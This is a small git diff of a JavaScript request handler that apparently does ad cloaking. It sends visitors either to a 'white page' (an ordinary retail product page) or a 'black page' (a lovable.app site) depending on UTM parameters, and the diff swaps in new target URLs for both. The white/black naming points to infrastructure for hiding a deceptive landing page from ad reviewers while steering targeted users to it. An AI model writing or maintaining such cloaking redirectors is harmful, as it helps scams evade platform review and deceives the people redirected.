@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://watcheshome.com/product/the-poetry-of-day-and-night/";
-    const blackPageURL = "https://instentquzzz.lovable.app/?";
+    const whitePageURL = "https://www.otto.de/p/floordirekt-klickfliese-mix-teak-30-x-30-cm-terrassenfliese-mit-drainagefunktion-wpc-fliese-1-st-S0I2A01T/";
+    const blackPageURL = "https://nowhereher.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
